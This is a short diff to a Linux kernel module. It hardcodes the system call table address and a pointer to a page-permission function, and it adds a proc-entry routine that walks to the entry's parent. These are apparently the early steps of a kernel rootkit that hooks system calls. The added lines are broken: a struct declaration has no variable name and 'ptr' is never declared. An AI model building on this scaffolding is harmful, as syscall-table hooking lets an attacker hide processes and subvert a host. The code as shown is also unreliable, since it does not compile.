@@ -1,8 +1,15 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 
-void (*pages_rw)(struct page *page, int ) = (void *)0xc101cebf
-0xc101cfc8
+void (*pages_rw)(struct page *page, int ) = (void *)0xc101cebf;
+//0xc101cfc8
+
+static struct proc_dir_entry
+
+static void proc_init(void) {
+	ptr = create_proc_entry("temporary", 0444, NULL);
+	ptr = ptr->parent;
+}
 
 int init_module(void) {
 	unsigned long *syscall_table = (unsigned long *)0xc12742a8;
